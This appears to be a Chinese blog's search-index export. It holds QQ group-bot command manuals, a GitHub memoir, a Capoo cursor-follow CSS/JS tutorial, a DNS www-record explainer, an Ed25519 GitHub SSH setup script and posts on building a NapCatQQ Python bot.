Hello\n\n\n\n注意事项\n输入的文字长度必须符合各命令的要求，否则会提示输入内容不合法。\n如果输入的文字为空，系统会提示重新输入。\n\n邀请链系统使用手册\n\n\n命令\n描述\n示例\n\n\n\nicon\n开启邀请链功能\nicon\n\n\nicoff\n关闭邀请链功能\nicoff\n\n\niclist@\n查看某用户的邀请链\niclist@123456789\n\n\ninvitechain\n显示邀请链系统菜单\ninvitechain\n\n\n示例\n开启邀请链功能: 发送 icon 到群聊。\n关闭邀请链功能: 发送 icoff 到群聊。\n查看某用户的邀请链: 发送 iclist@123456789，其中 123456789 是目标用户的 QQ 号。\n显示邀请链系统菜单: 发送 invitechain 到群聊。\n\n\n注意：只有群主、管理员或 root 管理员可以使用这些命令。\n\n关键词回复系统使用手册\n\n\n命令\n描述\n示例\n\n\n\nkron\n开启关键词回复功能\nkron\n\n\nkroff\n关闭关键词回复功能\nkroff\n\n\nkradd关键词 回复\n添加关键词回复\nkradd你好 你好世界\n\n\nkrrm关键词\n删除关键词回复\nkrrm你好\n\n\nkeywordsreply\n显示关键词回复系统菜单\nkeywordsreply\n\n\n说明:\n\nkradd 命令用于添加关键词及其对应的回复，格式为 kradd关键词 回复。\nkrrm 命令用于删除指定的关键词及其回复，格式为 krrm关键词。\nkron 和 kroff 用于开启和关闭关键词回复功能。\nkeywordsreply 命令用于显示系统菜单。\n\n群名片锁使用手册\n\n\n命令\n描述\n示例\n\n\n\nlgcon\n开启群名片锁\nlgcon\n\n\nlgcoff\n关闭群名片锁\nlgcoff\n\n\nlgclock\n锁定群名片\nlgclock[CQ:at,qq=12345]新名片\n\n\nlgcunlock\n解锁群名片\nlgcunlock[CQ:at,qq=12345]\n\n\nlgcset\n修改群名片\nlgcset[CQ:at,qq=12345]新名片\n\n\nlockgroupcard\n显示群名片锁菜单\nlockgroupcard\n\n\n示例\n开启群名片锁:\n输入 lgcon，系统会回复群名片锁已开启。\n\n\n关闭群名片锁:\n输入 lgcoff，系统会回复群名片锁已关闭。\n\n\n锁定群名片:\n输入 lgclock[CQ:at,qq=12345]新名片，将用户 12345 的群名片锁定为 新名片。\n\n\n解锁群名片:\n输入 lgcunlock[CQ:at,qq=12345]，将用户 12345 的群名片解锁。\n\n\n修改群名片:\n输入 lgcset[CQ:at,qq=12345]新名片，将用户 12345 的群名片修改为 新名片。\n\n\n显示群名片锁菜单:\n输入 lockgroupcard，系统会显示群名片锁的所有可用命令。\n\n\n\nNoAddOne 使用手册\n\n\n命令\n描述\n示例\n\n\n\nnaoon\n开启打断复读功能\nnaoon\n\n\nnaooff\n关闭打断复读功能\nnaooff\n\n\nnoaddone\n显示帮助菜单\nnoaddone\n\n\n示例\n开启打断复读功能:输入 naoon，将会开启打断复读功能，并回复确认信息。\n\n关闭打断复读功能:输入 naooff，将会关闭打断复读功能，并回复确认信息。\n\n显示帮助菜单:输入 noaddone，将会显示可用命令的帮助菜单。\n\n\nPokePal 使用手册命令格式\n\n\n命令格式\n描述\n\n\n\n[CQ:reply,id=&lt;消息ID&gt;].*骚扰&lt;次数&gt;\n对指定消息进行骚扰指定次数\n\n\n[CQ:reply,id=&lt;消息ID&gt;].*骚扰\n对指定消息进行骚扰 20 次\n\n\n示例\n\n\n示例命令\n说明\n\n\n\n[CQ:reply,id=12345].*骚扰5\n对消息 ID 为 12345 的消息进行 5 次骚扰\n\n\n[CQ:reply,id=67890].*骚扰\n对消息 ID 为 67890 的消息进行 20 次骚扰\n\n\nQASystem 使用手册以下是 QASystem 的命令及其使用示例：\n\n\n\n命令\n描述\n示例\n\n\n\nqaon\n开启问答系统\nqaon\n\n\nqaoff\n关闭问答系统\nqaoff\n\n\nqaadd\n批量添加或更新问答对\nqaadd 问题1 答案1 问题2 答案2\n\n\nqarm\n删除指定问题的问答对\nqarm问题1\n\n\nqalist\n查看问答对列表\nqalist\n\n\nqasolo\n比较两个词语的相似度\nqasolo词语1 词语2\n\n\nqasystem\n显示问答系统菜单\nqasystem\n\n\n\n注意:\n\nqaadd 命令后面可以跟多个问答对，格式为 问题 答案，多个问答对之间用空格分隔。\nqarm 命令后面直接跟要删除的问题。\nqasolo 命令用于比较两个词语的相似度，格式为 词语1 词语2。\n\n\nQFNUBustExamClassroomFind 使用手册以下是 QFNUBustExamClassroomFind 脚本的命令及其使用实例。\n\n\n\n命令\n描述\n示例\n\n\n\nqfnubecf\n切换曲阜师范大学期末考试考场教室查询功能的开关状态。\nqfnubecf\n\n\nxxx考场\n查询指定考场的教室信息，其中 xxx 为考场名称。\n综合教学楼考场\n\n\n示例\n开启&#x2F;关闭功能: 发送 qfnubecf 命令以切换功能状态。\n查询考场信息: 发送 综合教学楼考场 以查询综合教学楼的考场教室信息。\n\n\n注意: 只有授权用户才能切换功能状态。查询功能开启后，群内成员可以使用考场查询命令。\n\nQFNUTracker 使用手册以下是 QFNUTracker 的命令及其使用实例：\n\n\n\n命令\n描述\n示例\n\n\n\nqfnujwcon\n开启教务处监控\nqfnujwcon\n\n\nqfnujwcoff\n关闭教务处监控\nqfnujwcoff\n\n\nqfnuzccon\n开启资产处监控\nqfnuzccon\n\n\nqfnuzccoff\n关闭资产处监控\nqfnuzccoff\n\n\nqfnu\n显示 QFNU 定制服务信息\nqfnu\n\n\n以上命令可通过发送相应的消息来触发。请根据需要选择合适的命令进行操作。\n群发消息命令使用手册以下是 handle_SendAll_group_message 函数支持的命令及其使用示例：\n\n\n\n命令\n描述\n示例\n\n\n\nsendadd\n添加群号到群发列表\nsendadd123456789\n\n\nsendrm\n从群发列表中删除群号\nsendrm123456789\n\n\nsendlist\n列出所有群发的群号\nsendlist\n\n\nsendall\n向所有群发列表中的群发送消息\nsendallHello, everyone!\n\n\n注意事项：\n\n只有在 owner_id 列表中的用户才能执行这些命令。\nsendadd 和 sendrm 命令后面需要紧跟群号。\nsendall 命令后面需要紧跟要发送的消息内容。\n\n软封禁系统使用手册\n\n\n命令\n描述\n示例\n\n\n\nsbadd@\n添加软封禁用户，使用 @ 或 QQ 号指定用户。\nsbadd@123456\n\n\nsbrm@\n删除软封禁用户，使用 @ 或 QQ 号指定用户。\nsbrm@123456\n\n\nsblist\n查看当前群的软封禁用户列表。\nsblist\n\n\nsoftban\n显示软封禁系统菜单，包含所有可用命令的说明。\nsoftban\n\n\n注意: 以上命令需要管理员权限才能执行。\nTimeAwareGreetings 使用手册命令与实例\n\n\n命令\n描述\n示例\n\n\n\n早安\n发送早晨问候语\n早安～\n\n\n中午好\n发送中午问候语\n中午好，记得吃饭哦！\n\n\n晚安\n发送晚上问候语\n晚安，做个好梦！\n\n\n早上好\n发送早晨问候语\n早上好，今天又是元气满满的一天！\n\n\n午安\n发送中午问候语\n午安，充实的午后，别忘了补充维C！\n\n\n晚上好\n发送晚上问候语\n夜深了，早点休息哦～\n\n\n起床\n发送早晨问候语\n太阳都晒屁股了，快起床吧～\n\n\n午休\n发送中午问候语\n午休时间到了，休息一下吧！\n\n\n睡觉\n发送晚上问候语\n别熬夜了，晚安～\n\n\n注意事项\n根据用户输入的关键词匹配到对应的时段，发送相应的问候语。\n如果用户输入的时段与当前时段不匹配，将发送不合时宜的提示。\n以上命令仅为示例，实际使用中请根据具体需求进行调整。\n\nWelcomeFarewell 使用手册命令与实例\n\n\n命令\n描述\n示例\n\n\n\nwelcomefarewell\n显示总菜单\nwelcomefarewell\n\n\nwfon\n开启入群欢迎\nwfon\n\n\nwfoff\n关闭入群欢迎\nwfoff\n\n\nffon\n开启退群欢送\nffon\n\n\nffoff\n关闭退群欢送\nffoff\n\n\nwelcomeset &lt;自定义欢迎词&gt;\n设置自定义入群欢迎词\nwelcomeset 欢迎新朋友！\n\n\nfarewellset &lt;自定义欢送词&gt;\n设置自定义退群欢送词\nfarewellset 再见，祝好运！\n\n\n注意事项\n只有管理员或群主可以使用以上命令。\n自定义消息中可以包含 CQ 码。\n系统会自动记录成员的入群时间和退群时间。\n\n群词云功能使用手册\n\n\n命令\n描述\n示例\n\n\n\nwcon\n开启词云统计功能，开始记录群内所有聊天并汇总分词。\nwcon\n\n\nwcoff\n关闭词云统计功能，停止记录群内聊天。\nwcoff\n\n\n今日词云\n绘制并发送当天的词云图。\n今日词云\n\n\nwordcloud\n显示词云功能菜单，介绍词云功能及相关命令。\nwordcloud\n\n\n示例\n开启词云统计: 在群聊中发送 wcon，将会收到确认消息，表示词云统计已开启。\n关闭词云统计: 在群聊中发送 wcoff，将会收到确认消息，表示词云统计已关闭。\n获取今日词云: 在群聊中发送 今日词云，如果有数据，将会收到当天的词云图。\n查看词云菜单: 在群聊中发送 wordcloud，将会收到词云功能的详细菜单说明。\n\n哔哩哔哩直播动态监控（BilibiliPush）使用手册介绍哔哩哔哩直播动态监控是卷卷 bot 的一个功能，可以监控哔哩哔哩直播动态，并将其推送到指定群。\n开源地址：https://github.com/W1ndysBot/BilibiliPush#/\n命令| 命令 | 描述 | 示例 || bilipush | 开启或关闭哔哩哔哩直播动态监控 | bilipush || 订阅动态 xxx | 订阅动态 uid | bilipushuid 123456 || 取消订阅动态 xxx | 取消订阅动态 uid | bilipushuid 123456 || 订阅直播 xxx | 订阅直播 uid | bilipushlive 123456 || 取消订阅直播 xxx | 取消订阅直播 uid | bilipushlive 123456 || 查询订阅 | 查询订阅动态或直播 | bilipushuid |\n群互联（GroupLink）使用手册介绍群互联是卷卷 bot 的一个功能，可以实现多个群之间的消息互通。互联起来的群，当一个群有消息时，会向其他群转发。\n开源地址：https://github.com/W1ndysBot/GroupLink#/\n命令| 命令 | 描述 | 示例 || gl 开或关 | 开启或关闭群互联 | gl 开或关 || add 互联 | 添加互联群 | add 互联 || rm 互联 | 删除互联群 | rm 互联 |\n","categories":["QQbot"],"tags":["Python","QQbot","QQ机器人","NapCatQQ"]},{"title":"回忆我的Github","url":"/posts/471190f.html","content":"回忆我的 Github今天晚上突然想整顿一下自己的 Github pages，把以前的博客清算一下，不知怎么的就开始回忆了，给 Github 写了一大段小作文。\n用 Github Pages 搭建博客已经有一段时间了，一共写了 120 多篇文章，其中有些是技术文章，有些是生活感悟，也有些是随笔。\n也记录了选课指北和速通指南，起初这些只是一个普通的 README，后来开发了 2.0 版本，并且改名为 Easy-QFNU，已经成为一个正式的文档站。\n从最开始的看教程搭建博客，搞了三整天，还跟我妈咪炫耀，说我做了一个网站（实际上也是 搬运工 吧），到现在写过无数脚本（什么你写的，实际上都是 ChatGPT 写的吧）来提高工作效率，也实现了源码+静态页面同时备份，实现多端同步，也有了很多收获，也有很多想法。还帮我的同学，教同学搭建了自己的 Hexo 博客\n在这期间，我对 Github 也有了更深的了解\n2022&#x2F;2023 年 Github 生涯\n\n为什么我要把 22 年和 23 年放在一起说呢，因为我这两年时间还不如 24 年三天的活动多。没啥好回忆的。\n回望过去，2022 年 7 月 16 日，我第一次加入 Github, 那时候还是个小白，啥也不懂，也不懂什么是源代码托管。\n2023 年 07 月 03 日，我创建了我的第一个 repo，那时候还不是代码，我只是写了一个 README，用来收集常用的网站。\n2023 年 07 月 22 日我发出了我的第一个 issues，没想到那竟然是与安卓逆向相关的，我已经没有任何印象了。\n2023 年 07 月 28 日，创建了算是自己的第一个代码仓库，是我写的用 C++演奏音乐，演奏的 犁牛之子歌，当时还给校新媒体的师姐沟通，发到曲师大官方抖音了，看的人其实也不多， 毕竟也不是什么能吸引人的东西 。\n2023 年 09 月 11 日，在 fluid 仓库里发了一个 issues，那应该是我真正了解什么是 issues 之后的第一个 issues。\n2023 年 12 月 03 日，我开始尝试使用 ChatGPT 写脚本来提高我的日常工作效率，生成了第一个脚本，九宫格切图，并开源到了 Github。\n2023 年 12 月 10 日，我在统计表格的时候突发奇想，既然我做的都是机械化的工作，能不能用脚本来提高效率，于是我上传了我第二个脚本，Excel 日期更新。\n我 2023 年的 Github 生涯已经基本接近尾声了。\n2024 年 Github 生涯\n\n  1314次，还挺浪漫的\n\n\n真正让我对 Github 了解程度突飞猛进的时间是 2023-2024 年的寒假。因为我本来就打算换博客主题了，但是没想到两个主题的依赖有冲突，这让我不得不删库，重新建立博客，于是我又重新开始了我的博客之旅。从安装 Hexo 到配置主题，到部署，再到域名绑定，到评论系统的切换，到网站的镜像备份，我花了大量的时间，部署完毕之后还有一大堆 bug 要修。就因为这个我整整一个月都在搞博客。\n因此还对 VScode、Typora、Git、Markdown、Github、Hexo、HTML、CSS、JavaScript 等等都有了更深入的了解。\n还记得大一刚来的时候，舍友问我 zx（某挺好的教育系统） 支不支持 Markdown，那时候我连 Markdown 是什么都不知道，根本就没听说过，但是现在我已经每天都离不开 Markdown 了，写博客，做 Easy-QFNU，全是 Markdown 和 HTML，跟吃饭一样，比吃饭还勤快，我吃饭还有时候会忘了呢。\n2024 年 03 月 04 日，我学会了 Pull Request，第一次给公开仓库发起了 PR，还记得当时我还不知道什么是 PR，就像现在一样，我已经习惯了。\n2024 年 04 月 03 日，第一次成功的 Pull Request，给探姬的Hello-CTF提交了两个 Pull Request，一个因为效果适配性不太好，另一个还行，被合并了\n2024 年 04 月 06 日，创建了两个 Github 组织，一个是QFNU，致力于收集 QFNU 的优秀 repo，一个是Easy-QFNU，致力于维护 Easy-QFNU 文档站。\n此外我还获得了几个成就，看起来还蛮好看的，还学会了调用 API 美化自己的 Github 主页，蛮不错的\n\n到此也基本结束了\n2024 年也就这么多，等 25 年看看我整个 24 年会 commit 多少次吧。(目前最多的是我在维护 Easy-QFNU，在正式发布之前，截止到现在就已经 500+ commits 了)\n硕神，继续努力啊！\n别忘了你的关于页面是怎么写的\nEND\n","categories":["Github"],"tags":["Github"]},{"title":"在你的网站中添加Capoo！（调皮的猫猫虫）","url":"/posts/3a360f71.html","content":"\n本教程基于 https://docs.api.ecylt.top/kemomimi-jiang#/ 进行魔改\n\nCapoo效果展示\n创建 css复制下面代码，创建一个名为 Capoo.css 的文件，代码以及参数均已加注释\n#follow-img &#123;    pointer-events: none; /* 禁止图像接受鼠标事件 */    position: absolute; /* 设置图像的定位方式为绝对定位，相对于其最近的具有定位属性的父元素进行定位 */    transition: transform 0.5s, top 0.5s, left 0.5s; /* 定义了图像在发生变化时的过渡效果，其中 transform 表示图像的旋转效果，top 表示图像的垂直移动效果，left 表示图像的水平移动效果，0.5s 表示过渡时间为0.5秒 */&#125;\n\n创建 js复制下面代码，创建一个名为 Capoo.js 的文件\nconst img = document.getElementById(&#x27;follow-img&#x27;); // 获取图像元素let mouseX = 0, mouseY = 0; // 鼠标的初始位置let imgX = 0, imgY = 0; // 图像的初始位置let speed = 0.05; // 图像移动的速度let rotateDeg = 0; // 图像的旋转角度// 缩小图片大小img.style.width = &#x27;100px&#x27;; // 设置图像的宽度为100像素img.style.height = &#x27;auto&#x27;; // 保持宽高比function animate() &#123;    let dx = mouseX - imgX; // 计算鼠标在水平方向上的位移    let dy = mouseY - imgY; // 计算鼠标在垂直方向上的位移    let angle = Math.atan2(dy, dx); // 计算鼠标相对于图像的角度    rotateDeg = angle * (180 / Math.PI) + 90; // 将弧度转换为角度，并加上90度作为旋转角度    imgX += dx * speed; // 更新图像的水平位置    imgY += dy * speed; // 更新图像的垂直位置    img.style.left = `$&#123;imgX - img.width / 2&#125;px`; // 设置图像相对于左边界的位置    img.style.top = `$&#123;imgY - img.height / 2&#125;px`; // 设置图像相对于上边界的位置    img.style.transform = `rotate($&#123;rotateDeg&#125;deg)`; // 应用旋转角度    requestAnimationFrame(animate); // 循环调用动画函数，实现动画效果&#125;document.addEventListener(&#x27;mousemove&#x27;, (e) =&gt; &#123;    mouseX = e.pageX; // 更新鼠标的水平位置    mouseY = e.pageY; // 更新鼠标的垂直位置&#125;);// 添加对移动端的判断function isMobile() &#123;    return window.innerWidth &lt;= 768 &amp;&amp; window.innerHeight &lt;= 1024; // 判断是否为移动端&#125;if (!isMobile()) &#123; // 如果不是移动端    animate(); // 调用动画函数&#125; else &#123; // 如果是移动端    img.style.display = &#x27;none&#x27;; // 隐藏图像&#125;\n\n创建 GIF保存这个 GIF 图片到你的 source 合适的位置\n此处不限类型，只要是图片都可以，jpg，png 等\n\n引入在你的主题中引入这三个文件，比如我的\n注意，css 文件一定要引入在 head 前面，另外两个任意都行，head 或者 body 都行\n- &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/css/Capoo.css&quot;&gt;- &lt;img id=&quot;follow-img&quot; src=&quot;../images/Capoo/Capoo.gif&quot;/&gt;- &lt;script src=&quot;/js/Capoo.js&quot;&gt;&lt;/script&gt;\n\n同理你也可以把图片文件换成自己喜欢的小图片\n","categories":["技术教程","Hexo"],"tags":["Hexo","Hexo美化","butterfly美化"]},{"title":"域名配置中 www 的两种实现方式详解","url":"/posts/8f735965.html","content":"\n  \n    \n      提示\n\n    \n    \n      本文内容包含 AI 生成，仅供参考。\n\n    \n  \n\n在网站部署中，我们经常会遇到有关域名配置的问题，其中比较常见的一点是关于 www 开头的域名 该如何配置。它既可以作为根域名的一个记录值，也可以作为一个独立的子域名使用。本文将详细解释这两种配置方式的区别及适用场景，帮助你选择适合自己项目的方案。\n\n1. 在根域名添加 www 开头的记录值这种方式是通过在根域名（例如 example.com）的 DNS 设置中添加一条 www 开头的记录实现的。\n配置方法通常需要在 DNS 控制台中添加如下记录：\n\n主机记录（Host）： www\n记录类型（Type）： A（解析到 IP 地址）或 CNAME（指向另一个域名）\n记录值（Value）： 指向的服务器 IP 或目标域名\n\n例如，配置如下记录后，用户访问 www.example.com 时会被解析到 192.168.1.1：\n\n\n\n主机记录\n记录类型\n记录值\n\n\n\nwww\nA\n192.168.1.1\n\n\n特点\nwww 是根域名的一个主机记录，并非真正的子域名。\n一般用于将 www.example.com 指向与 example.com 相同的服务器。\n适合需要简化配置、统一指向的场景。\n\n\n2. 添加一个 www 开头的子域名另一种方式是将 www 配置为一个独立的子域名，与其他子域名（例如 api.example.com 或 blog.example.com）具有相同的地位。\n配置方法在 DNS 控制台中添加如下记录：\n\n主机记录（Host）： www\n记录类型（Type）： 根据需要选择 A 或 CNAME\n记录值（Value）： 可指向独立的服务器或服务\n\n例如：\n\n\n\n主机记录\n记录类型\n记录值\n\n\n\nwww\nCNAME\ncdn.example-cdn.com\n\n\n特点\nwww 被视为独立的子域名，和其他子域名地位相同。\n可以指向完全不同的服务器或服务，适合更灵活的场景。\n常用于将 www 子域名用于独立的站点部署、CDN 加速或负载均衡等。\n\n\n3. 两种方式的区别对比\n\n\n区别点\n根域名添加 www 记录值\n创建独立的 www 子域名\n\n\n\nwww 的作用\n根域名的一个主机记录，通常指向同一服务器\n独立子域名，可用于不同用途\n\n\n灵活性\n灵活性较低，适用于统一解析\n灵活性更高，可独立配置\n\n\n是否独立\n不独立，与根域名紧密关联\n独立子域名，可完全分离\n\n\n适用场景\n通常用于简单的站点配置，例如统一指向一个站点\n用于特殊需求，例如独立站点或 CDN 加速\n\n\n\n4. 如何选择适合自己的配置？选择合适的配置方式主要取决于项目需求：\n\n如果 www 和根域名指向相同服务：推荐在根域名添加 www 开头的记录值，这种方式简单且高效，适合大部分常规网站。\n\n如果需要为 www 子域名配置不同服务：推荐将 www 配置为独立子域名，尤其是当你需要为 www 启用 CDN 加速、负载均衡或托管在不同服务器时。\n\n\n\n5. 小结无论选择哪种方式，www 的配置都需要根据项目的具体需求来定。如果只是一个普通的网站，直接通过根域名添加 www 开头的记录值即可满足需求；但如果你的项目对子域名有更多功能和用途需求，那么将 www 配置为独立子域名则会更适合。\n希望本文能帮助你更好地理解和配置域名中的 www！如果你有其他域名配置相关的问题，欢迎留言讨论 😊。\n","categories":["技术教程"],"tags":["DNS","域名配置","网站部署"]},{"title":"基于Ed25519算法的配置Github SSH的shell脚本","url":"/posts/65dfe81d.html","content":"前言在使用 GitHub 时，SSH 是一种更安全和便捷的认证方式。本文将介绍一个基于 Ed25519 算法的 GitHub SSH 配置脚本，并详细解释为什么选择 Ed25519 算法。\n为什么选择 Ed25519？Ed25519 是现代密码学中最受推荐的算法之一，相比传统的 RSA 算法具有以下优势：\n1. 更高的安全性\n基于 Edwards-curve Digital Signature Algorithm (EdDSA)\n256 位密钥长度就能提供与 RSA-4096 相当的安全性\n对量子计算攻击具有更好的抵抗性\n\n2. 卓越的性能\n密钥生成速度快\n签名和验证效率高\n资源消耗低\n\n3. 简洁的密钥长度\n公钥仅 68 字节\n私钥仅 32 字节\n大大简化了密钥的管理和传输\n\n配置脚本以下是一个完整的 GitHub SSH 配置脚本：\n#!/bin/bash# 设置颜色输出GREEN=&#x27;\\033[0;32m&#x27;RED=&#x27;\\033[0;31m&#x27;NC=&#x27;\\033[0m&#x27; # No Colorecho -e &quot;$&#123;GREEN&#125;开始配置 GitHub SSH 连接$&#123;NC&#125;&quot;# 检查是否存在 SSH 密钥if [ ! -f ~/.ssh/id_ed25519 ]; then    echo &quot;未找到现有的 SSH 密钥，正在生成新的密钥...&quot;    read -p &quot;请输入你的 GitHub 邮箱: &quot; email    ssh-keygen -t ed25519 -C &quot;$email&quot;else    echo &quot;已找到现有的 SSH 密钥&quot;fi# 确保 SSH 代理正在运行eval &quot;$(ssh-agent -s)&quot;ssh-add ~/.ssh/id_ed25519# 创建或更新 SSH 配置mkdir -p ~/.sshcat &gt; ~/.ssh/config &lt;&lt; EOLHost github.com    Hostname ssh.github.com    Port 443    User gitEOLecho -e &quot;$&#123;GREEN&#125;SSH 配置已更新$&#123;NC&#125;&quot;# 显示公钥echo -e &quot;\\n$&#123;GREEN&#125;以下是你的 SSH 公钥，请将其添加到 GitHub：$&#123;NC&#125;&quot;cat ~/.ssh/id_ed25519.pub# 测试连接echo -e &quot;\\n$&#123;GREEN&#125;正在测试 GitHub 连接...$&#123;NC&#125;&quot;ssh -T git@github.comecho -e &quot;\\n$&#123;GREEN&#125;配置完成！$&#123;NC&#125;&quot;echo &quot;如果上面显示 &#x27;Hi username! You&#x27;ve successfully authenticated&#x27; 则表示配置成功&quot; \n\n脚本功能说明\n密钥检查与生成\n\n检查是否存在现有的 Ed25519 密钥\n如果不存在，则生成新的密钥对\n\n\nSSH 代理配置\n\n启动 SSH 代理\n添加私钥到 SSH 代理\n\n\n特殊网络环境适配\n\n使用 443 端口替代默认的 22 端口\n适配中国大陆网络环境\n\n\n自动化配置\n\n自动创建和配置 SSH 配置文件\n提供即时的连接测试\n\n\n\n使用方法\n创建脚本文件：\n复制上述脚本内容到文件中\n运行脚本：\n按照提示将公钥添加到 GitHub 设置中\n\n注意事项\n运行脚本前确保已安装 ssh-keygen 和 ssh-agent\n可能需要 sudo 权限来修改 SSH 配置\n确保妥善保管生成的私钥\n如果已有其他 SSH 密钥，注意备份\n\n总结使用 Ed25519 算法配置 GitHub SSH 不仅提供了更好的安全性，还能获得更优的性能。通过这个自动化脚本，我们可以快速完成配置，避免了手动操作可能带来的错误。特别是对于中国大陆用户，脚本中的 443 端口配置可以有效解决连接问题。\n参考资料\nGitHub 官方文档：生成新的 SSH 密钥\nEd25519: high-speed high-security signatures\n\n","categories":["技术教程","Github"],"tags":["GitHub","SSH","Shell","Ed25519"]},{"title":"基于NapCatQQ和Python的 QQ 机器人实现","url":"/posts/56783215.html","content":"开发背景\n也是我与 QQbot 之间的羁绊吧，作者的一些碎碎念\n\n久违了啊，老友，说不出的感觉涌上心头 😇\n还记得那会是初中，忘了上几年级了，大概在 17 年左右认识了酷 Q，只能用别人的插件不会自己开发功能，学了一段时间苦于环境不会配置放弃了，后来 18，19 年左右认识了 QRspeed（-dic），基于关键词的词库程序，看着语法文档自己写出来一套（大概 4000 行左右吧）自己用的源码（严格来说应该叫词库称不上是源码），这是我第一次自己写自己想要的功能。但苦于 qrspeed 词库算不上真正的编程语言，所以一直拿不出手。后来因为寄宿学校，版本更新很快，逐渐跟不上了语法的变化了。\n后来，晨风机器人作者喝茶，酷 Q 关站，qrspeed 也停运，受 tx 打压 QQ 机器人几乎死路一条。高中了解到 nonebot2，环境不会搭，放弃了上大学之后了解到 mirai，这是我第三个用了很久一段时间的机器人框架，可惜的是，我认识他的时候他就已经到寒冬了，随处可见的 code &#x3D; 45，封过 n 次的 QQ 号…..不过我依旧想自己开发自己想要的功能，由于 mirai 基于 kotlin，学了一段时间 kotlin 没学会，环境也没搭好，又放弃了，还因此认识了小白师傅。（电脑也因此中了一次蠕虫）\n大二，认识了 koishi 和 napcatQQ，一开始不懂 Websocket 协议，也没深入了解 napcatQQ 的工作原理，仍然是只会安装别人写好的 koishi 插件，奈何我 2c2g 的服务器跑 koishi 很慢，基于 TypeScript 的 koishi，本来打算这次暑假学一学自己开发 TS 插件。\n但是，今天忽然想起来先前 Liu 提到过一次基于 Python 和 napcatQQ 的，他已经实现了，我也可以试试，看看套神 mumuzi 的博客基于 http 协议处理消息，借助 ChatGPT 实现了和他完全不一样的 WebSocket 协议，搞了整整一下午一个晚上，基本实现了敏感词监控，禁言解禁，撤回等功能。（github.com&#x2F;W1ndys&#x2F;bot）感觉还是 ChatGPT 牛逼，我一个从来没听说过 Python 异步的小白都能写出来想要的功能。\n真正的编程语言实现，真正方便的环境搭建一切都得益于开箱即用的 Python 和万能的 ChatGPT 四年，终于找到当年的感觉了。\n安装方法我推荐使用 Linux docker 容器安装，如果运行环境崩了可以重新导入镜像\ndocker 安装：NapNeko&#x2F;NapCat-Docker: NapCat-Docker (github.com)\n一键安装脚本：NapCatQQ (napneko.github.io)\n拾雪（NapCatQQ 作者）更新了新的说明文档，安装这一部分可以直接看官方文档了，写的很明白\nNapCat | NapCatQQ\n进行完这一步可以直接跳到 实现功能 部分\n实现功能我自己用的机器人的所有代码都开源在 W1ndysBot，可以参考更方便理解\n2024 年 8 月 3 日我学习模块化编程之后，写出了模块加载器, W1ndysBot&#x2F;ModuleLoader: 对接 OneBot 的 Python 模块加载器，可以前往模块加载器继续开发\n测试消息发送假设小号与大号创建了一个群聊，这里测试的是群聊中是否出现指定字符串，出现则发送一条消息，以“测试”和“测试成功”为例\n\nW1ndysBot 的开发请看我的其他博客，待更新\n致谢NapCatQQ (napneko.github.io)\nCursor - The AI Code Editor\n","categories":["QQbot"],"tags":["Python","QQbot","QQ机器人","NapCatQQ"]},{"title":"基于Python + OneBot 11的QQ机器人模块加载器的实现","url":"/posts/e35cbf79.html","content":"源代码请看：W1ndys-bot&#x2F;Module-Loader: 对接 OneBot 的 Python 模块加载器 (github.com)\n对接 OneBot 的 Python 模块加载器\n介绍及背景Python 编写的模块加载器，使用 WebSocket 客户端模式对接上游服务，支持 OneBot 协议，如遇到问题请提 issue\n本加载器不以插件的形式进行加载，而是以模块的形式进行加载。\n这也就意味着，本加载器的功能增加，直接写代码即可，无需配置相关插件信息。\n\n写这个加载器的原因是，了解到了 mf 师傅的插件式加载器，但我本人并不习惯这种方法，于是就写了这个模块式加载器，整个加载器的配置全部采用 Python 模块化编程，功能的开发模式完全基于原生 Onebot11。\n有关插件式加载器的文档请参考：School-Robot&#x2F;Plugin-Loader: 用于对接 OneBot 的 Python 插件加载器 (github.com)\n\n加载器特色\n模块化编程，易于维护\n支持断线重连，无需手动重启\n支持上线提醒（QQ），掉线提醒（钉钉）\n支持 OneBot 11 标准，采用原生的 OneBot 11 标准进行开发\n\nAPI 文档OneBot 11 标准 botuniverse &#x2F;onebot-11: OneBot 11 标准 (github.com)\ngo-cqhttp API | go-cqhttp 帮助中心\n\n备注：本机器人实现基于 Python 做核心开发，使用 NapCatQQ 作为消息平台，OneBot 11 作为 QQ 机器人 API 实现。\n\n使用方法安装依赖pip install -r requirements.txt\n\n配置基本信息配置 ws 连接和管理员打开 app/config.py\nowner_id = [123]  # 机器人 root 管理员 QQ 号ws_url = &quot;xxx&quot;  # napcatQQ 监听的 WebSocket API 地址token = &quot;xxx&quot;  # 如果需要认证，请填写认证 token\n\n配置钉钉通知打开 app/config.py\n这里替换为你自己的 TOKEN，不要直接用我的，我的有 IP 验证，用我的也没用DD_BOT_TOKEN = &quot;xxx&quot;# 这里替换为你自己的 SECRET，不要直接用我的，我的有 IP 验证，用我的也没用DD_BOT_SECRET = &quot;xxx&quot;\n\n开发文档开发功能请参考：dev.md\n","categories":["QQbot"],"tags":["Python","QQbot","QQ机器人","NapCatQQ"]},{"title":"基于NapCatQQ和Python的QQ机器人开发——JSON消息的发送（消息段数组的运用）","url":"/posts/9bd67233.html","content":"什么是消息段数组请看 onebot11 官方文档 onebot-11&#x2F;message&#x2F;array.md at master · botuniverse&#x2F;onebot-11 (github.com)\n以前我都是直接发的 CQ 码（什么是 CQ 码？onebot-11&#x2F;message&#x2F;string.md at master · botuniverse&#x2F;onebot-11 (github.com)）\n今天突发奇想的想试试直接发推荐卡片，当我尝试发 CQ 码的时候失败了，然后我去找 NapCatQQ 开发者拾雪问了一下，大佬是这么说的，不能直接用 CQ 码，因为涉及到签名等东西，需要用扩展接口，让我去看文档。\n去文档找了一下，确实找到了，我本以为能顺理成章的解决问题，但是不出意外的话出意外了。\n下面内容基于 Python 和正向 Websocket 连接实现\n\n说句题外话，小白的一个大误区，向别人提问题，尤其是计算机相关的问题，一定要一次性的把问题说全，可以分好几条发，被提问者一般不会因此嫌弃厌烦，反而会很喜欢，因为你把尽可能用到的信息全都提供出来了，有助于问题的解决\n新手要学会的几件事，提问的时候要尽可能多的提供\n\n相关的运行日志，报错日志\n相关的源代码\n相关的必要的截图\n做好敏感数据的处理\n\n\n如何发消息再 Onebot11 标准文档里给出了发送消息的 API，详情可见如下\n发送私聊消息：onebot-11&#x2F;api&#x2F;public.md at master · botuniverse&#x2F;onebot-11 (github.com)\n发送群消息：onebot-11&#x2F;api&#x2F;public.md at master · botuniverse&#x2F;onebot-11 (github.com)\n发送消息：onebot-11&#x2F;api&#x2F;public.md at master · botuniverse&#x2F;onebot-11 (github.com)\n如何通信NapCatQQ 基于 Onebot11 协议进行通信，这里我只以正向 Websocket 